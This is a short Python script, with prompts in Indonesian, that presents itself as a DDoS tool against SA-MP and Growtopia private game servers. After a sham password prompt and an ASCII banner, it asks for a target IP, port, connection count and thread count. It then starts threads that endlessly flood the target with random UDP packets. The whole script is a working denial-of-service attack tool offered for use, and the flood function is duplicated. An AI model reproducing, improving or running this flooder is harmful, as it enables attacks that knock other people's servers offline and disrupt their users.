#login tools
password ="Ddos"
import random
import socket
import threading
import os,sys
import time

os.system("clear")

for i in range(3):
	pwd = input("[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] TUNGGU BERAPA DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Salah Password Bego!!! ")
		continue
time.sleep(5)
print("{√} Done Use Password \u001b[33mDdos")
time.sleep(5)

print("""
\u001b[31m
TOOL DDOS FOR SAMP || GTPS || DONT FCKING ABUSE
███████╗██╗░░░██╗░█████╗░██╗░░██╗
██╔════╝██║░░░██║██╔══██╗██║░██╔╝
█████╗░░██║░░░██║██║░░╚═╝█████═╝░
██╔══╝░░██║░░░██║██║░░██╗██╔═██╗░
██║░░░░░╚██████╔╝╚█████╔╝██║░╚██╗
╚═╝░░░░░░╚═════╝░░╚════╝░╚═╝░░╚═╝

██╗░░░██╗░█████╗░██╗░░░██╗
╚██╗░██╔╝██╔══██╗██║░░░██║
░╚████╔╝░██║░░██║██║░░░██║
░░╚██╔╝░░██║░░██║██║░░░██║
░░░██║░░░╚█████╔╝╚██████╔╝
░░░╚═╝░░░░╚════╝░░╚═════╝░
""")


ip = str(input("   \u001b[31m[$] \u001b[37mMasukan Ip nya :\u001b[31m  "))
time.sleep(3)
print(" ")
port = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Port nya :\u001b[31m  "))
print(" ")
times = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Connections :\u001b[31m  "))
print(" ")
threads = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Threading :\u001b[31m  "))
time.sleep(3)

# Attack
def wt():
	data = random._urandom(1500)
	i = random.choice(("[x]","[$]","[✓]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i,f"\u001b[33m [$] $ATTACKING ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(i,f"\u001b[33m [$] $ATTACKING ════> \u001b[31mAttack to Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")

# Attack
def wt():
	data = random._urandom(264)
	i = random.choice(("[x]","[$]","[✓]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i,f"\u001b[33m [$] $ATTACKING ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(i,f"\u001b[33m [$] $ATTACKING ════> \u001b[31mAttack to Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()